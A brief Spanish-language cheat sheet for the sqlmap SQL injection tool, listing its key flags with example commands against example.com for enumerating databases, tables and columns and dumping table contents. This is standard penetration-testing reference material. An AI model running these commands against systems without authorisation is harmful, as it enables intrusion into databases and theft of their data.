SQLmap es una herramienta fortísima que nos permite identificar y explotar SQLinjections, extraer información de las bases de datos, ejecutar comandos en el SO subyacente y probar la seguridad de aplicaciones web.
``` bash
sqlmap -u "http://example.com/page?id=1" --dbs --level=3 --risk=2
```
## Parámetros clave

|             |                                                    |                                                                                  |
| ----------- | -------------------------------------------------- | -------------------------------------------------------------------------------- |
| -u          | Indica la URL víctima                              | sqlmap -u "http://example.com/page?id=1"                                         |
| --dbs       | Enumera las DBs disponibles                        | sqlmap -u "http://example.com/page?id=1" --dbs                                   |
| --tables    | Enumera las tablas de una DB                       | sqlmap -u "http://example.com/page?id=1" -D mydatabase --tables                  |
| --columns   | Enumera las columnas de una tabla                  | sqlmap -u "http://example.com/page?id=1" -D mydatabase -T mytable --columns      |
| --dump      | Extrae datos de una tabla                          | sqlmap -u "http://example.com/page?id=1" -D mydatabase -T mytable --dump         |
| -D DB       | Selecciona una DB                                  | sqlmap -u "http://example.com/page?id=1" -D mydatabase                           |
| -T TABLE    | Selecciona una tabla                               | sqlmap -u "http://example.com/page?id=1" -D mydatabase -T mytable                |
| --level N   | Nivel de intensidad pruebas 1-5                    | sqlmap -u "http://example.com/page?id=1" --level=3                               |
| --risk N    | Nivel de riesgo 1-3 (mas agresividad)              | sqlmap -u "http://example.com/page?id=1" --risk=2                                |
| --technique | Selección de técnicas de inyección                 | sqlmap -u "http://example.com/page?id=1" --technique=BEUSTQ                      |
| --cookie    | Define cookies de autenticación                    | sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"               |
| --proxy     | Usa un proxy para las solicitudes                  | sqlmap -u "http://example.com/page?id=1" --proxy="http://proxy.example.com:8080" |
| --forms     | Habilita la detección y explotación de formularios |                                                                                  |
| --batch     | Omite todas las confirmaciones                     |                                                                                  |
